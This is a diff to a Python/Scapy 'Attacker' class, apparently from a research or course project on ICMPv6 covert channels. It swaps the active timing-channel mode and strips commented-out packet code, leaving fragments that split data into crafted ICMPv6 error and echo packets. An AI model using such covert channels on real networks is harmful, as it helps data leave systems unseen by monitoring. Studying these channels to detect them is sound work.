@@ -45,9 +45,9 @@ class Attacker:
         #self.send_destination_unreachable(data, ip_dst, ip_src)          
         
         # Equazione retta Timing CC y=1.17667x^{2}-4.66x+11.81333
-        #self.send_timing_channel_1bit(data, ip_dst, ip_src) 
+        self.send_timing_channel_1bit(data, ip_dst, ip_src) 
         #self.send_timing_channel_2bit(data, ip_dst, ip_src) 
-        self.send_timing_channel_4bit(data, ip_dst, ip_src) 
+        #self.send_timing_channel_4bit(data, ip_dst, ip_src) 
 
     def send_information_reply(self,data:bytes=None,ip_dst=None,ip_src=None): 
         TYPE_INFORMATION_REQUEST=128
@@ -141,18 +141,7 @@ class Attacker:
             interface=mymethods.default_iface() 
         dst_mac=com.get_mac_by_ipv6(addr_dst.compressed, addr_src.compressed, interface)  
         src_mac = get_if_hwaddr(interface) 
-        #pkt= (
-        #    Ether(dst=dst_mac, src=src_mac) /
-        #    IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
-        #    ICMPv6EchoReply(type=TYPE_INFORMATION_REQUEST,id=0, seq=0) / 
-        #    Raw(load="Hello Neighbour".encode())
-        #) 
-        #print(f"Sending {pkt.summary()} through interface {interface}")  
-        #ans = sendp(pkt, verbose=1,iface=interface) 
-        #if ans: 
-        #    print("ans: ",ans.show())
-        #    return True  
-        #return False 
+        
         print("DATA: ",len(data)," : ",data)  
         for index in range(0, len(data), 8):  
             dummy_pkt=(
@@ -176,17 +165,6 @@ class Attacker:
                 print(ans.show())
                 #return True  
             #return False 
-        #pkt= (
-        #    Ether(dst=dst_mac, src=src_mac)
-        #    /IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)
-        #    /ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=icmp_id)
-        #)
-        #print(f"Sending {pkt.summary()}") 
-        #ans = sendp(pkt, verbose=1,iface=interface) 
-        #if ans: 
-            #print(ans.show())
-            #return True  
-        #return False
 
         dummy_pkt=(
             IPerror6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
@@ -202,7 +180,7 @@ class Attacker:
         ans = sendp(pkt, verbose=1,iface=interface) 
         if ans: 
             print(ans.show())
-        #    return True  
+        #   #return True  
         #return False  
 
     def send_time_exceeded(self, data:bytes=None, ip_dst=None, ip_src=None): 
@@ -226,20 +204,7 @@ class Attacker:
             print(f"Excepion: {e}")  
             interface=mymethods.default_iface() 
         dst_mac=com.get_mac_by_ipv6(addr_dst.compressed, addr_src.compressed, interface)  
-        src_mac = get_if_hwaddr(interface)  
-
-        #pkt= (
-        #    Ether(dst=dst_mac, src=src_mac) /
-        #    IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
-        #    ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=0, seq=0) / 
-        #    Raw(load="Hello Neighbour".encode())
-        #) 
-        #print(f"Sending {pkt.summary()} through interface {interface}")  
-        #ans = sendp(pkt, verbose=1,iface=interface) 
-        #if ans: 
-        #    print("ans: ",ans.show())
-        #    #eturn True  
-        #return False 
+        src_mac = get_if_hwaddr(interface) 
 
         print("DATA: ",data)  
         for index in range(0, len(data), 4): 
@@ -259,13 +224,7 @@ class Attacker:
                 print(ans.show())
                 #return True  
             #return False 
-
-        #pkt= (
-        #    Ether(dst=dst_mac, src=src_mac) /
-        #    IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
-        #    ICMPv6EchoReply(type=TYPE_INFORMATION_REQUEST,id=0, seq=1) / 
-        #    Raw(load="Hello Neighbour".encode())
-        #) 
+        
         dummy_pkt=(
             IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed, plen=0xffff)  /
             ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=0, seq=1)
@@ -305,20 +264,7 @@ class Attacker:
             print(f"Excepion: {e}")  
             interface=mymethods.default_iface() 
         dst_mac=com.get_mac_by_ipv6(addr_dst.compressed, addr_src.compressed, interface)  
-        src_mac = get_if_hwaddr(interface) 
-
-        #pkt= (
-        #    Ether(dst=dst_mac, src=src_mac) /
-        #    IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
-        #    ICMPv6EchoReply(type=TYPE_INFORMATION_REQUEST,id=0, seq=0) / 
-        #    Raw(load="Hello Neighbour".encode())
-        #) 
-        #print(f"Sending {pkt.summary()} through interface {interface}")  
-        #ans = sendp(pkt, verbose=1,iface=interface) 
-        #if ans: 
-        #    print("ans: ",ans.show())
-        #    #return True  
-        #return False 
+        src_mac = get_if_hwaddr(interface)  
 
         print("DATA: ",data)  
         for index in range(0, len(data), 8): 
